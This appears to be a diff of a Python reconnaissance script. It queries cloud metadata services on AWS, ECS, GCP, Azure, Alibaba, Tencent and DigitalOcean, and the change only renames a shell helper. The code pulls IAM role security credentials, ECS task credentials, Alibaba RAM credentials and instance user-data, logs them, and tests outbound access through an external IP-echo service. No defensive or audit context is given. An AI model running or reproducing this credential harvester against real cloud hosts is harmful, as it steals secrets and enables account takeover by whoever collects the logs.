@@ -75,24 +75,24 @@ def imds_aws():
     for p in ["instance-id", "instance-type", "placement/region", "placement/availability-zone",
               "ami-id", "local-hostname", "public-ipv4", "mac", "iam/info",
               "identity-credentials/ec2/info", "network/interfaces/macs/", "services/domain"]:
-        d[p] = sh(base + "-w '\\nHTTP=%{http_code}' http://169.254.169.254/latest/meta-data/" + p, 8)["out"][:900]
-    d["role_list"] = sh(base + "-w '\\nHTTP=%{http_code}' http://169.254.169.254/latest/meta-data/iam/security-credentials/", 8)["out"][:500]
+        d[p] = shd(base + "-w '\\nHTTP=%{http_code}' http://169.254.169.254/latest/meta-data/" + p, 8)["out"][:900]
+    d["role_list"] = shd(base + "-w '\\nHTTP=%{http_code}' http://169.254.169.254/latest/meta-data/iam/security-credentials/", 8)["out"][:500]
     roles = [x.strip() for x in d["role_list"].split("\n")[0].split() if x.strip()] if "HTTP=200" in d["role_list"] else []
     d["roles"] = roles
     for r in roles[:2]:
-        d["cred_" + r] = sh(base + "-w '\\nHTTP=%{http_code}' http://169.254.169.254/latest/meta-data/iam/security-credentials/" + r, 8)["out"][:3000]
-    d["userdata"] = sh(base + "-w '\\nHTTP=%{http_code}' http://169.254.169.254/latest/user-data", 8)["out"][:2500]
-    d["ecs"] = sh("curl -s -m 3 -w '\\nHTTP=%{http_code}' --noproxy '*' http://169.254.170.2/v2/credentials", 8)["out"][:800]
+        d["cred_" + r] = shd(base + "-w '\\nHTTP=%{http_code}' http://169.254.169.254/latest/meta-data/iam/security-credentials/" + r, 8)["out"][:3000]
+    d["userdata"] = shd(base + "-w '\\nHTTP=%{http_code}' http://169.254.169.254/latest/user-data", 8)["out"][:2500]
+    d["ecs"] = shd("curl -s -m 3 -w '\\nHTTP=%{http_code}' --noproxy '*' http://169.254.170.2/v2/credentials", 8)["out"][:800]
     log("imds_aws", d)
 
 
 def cloud_probe():
     d = {}
-    d["gcp"] = sh("curl -s -m 3 -w '\\nHTTP=%{http_code}' --noproxy '*' -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/?recursive=true | head -25", 8)["out"][:2000]
-    d["azure"] = sh("curl -s -m 3 -w '\\nHTTP=%{http_code}' --noproxy '*' -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'", 8)["out"][:1200]
-    d["alibaba"] = sh("curl -s -m 3 -w '\\nHTTP=%{http_code}' --noproxy '*' http://100.100.100.200/latest/meta-data/ram/security-credentials/", 8)["out"][:800]
-    d["tencent"] = sh("curl -s -m 3 -w '\\nHTTP=%{http_code}' --noproxy '*' http://metadata.tencentyun.com/latest/meta-data/instance-id", 8)["out"][:400]
-    d["digitalocean"] = sh("curl -s -m 3 -w '\\nHTTP=%{http_code}' --noproxy '*' http://169.254.169.254/metadata/v1/id", 8)["out"][:400]
+    d["gcp"] = shd("curl -s -m 3 -w '\\nHTTP=%{http_code}' --noproxy '*' -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/?recursive=true | head -25", 8)["out"][:2000]
+    d["azure"] = shd("curl -s -m 3 -w '\\nHTTP=%{http_code}' --noproxy '*' -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'", 8)["out"][:1200]
+    d["alibaba"] = shd("curl -s -m 3 -w '\\nHTTP=%{http_code}' --noproxy '*' http://100.100.100.200/latest/meta-data/ram/security-credentials/", 8)["out"][:800]
+    d["tencent"] = shd("curl -s -m 3 -w '\\nHTTP=%{http_code}' --noproxy '*' http://metadata.tencentyun.com/latest/meta-data/instance-id", 8)["out"][:400]
+    d["digitalocean"] = shd("curl -s -m 3 -w '\\nHTTP=%{http_code}' --noproxy '*' http://169.254.169.254/metadata/v1/id", 8)["out"][:400]
     d["egress"] = sh("curl -s -m 5 --noproxy '*' -k https://api.ipify.org 2>&1", 10)["out"][:200]
     log("cloud_probe", d)
 
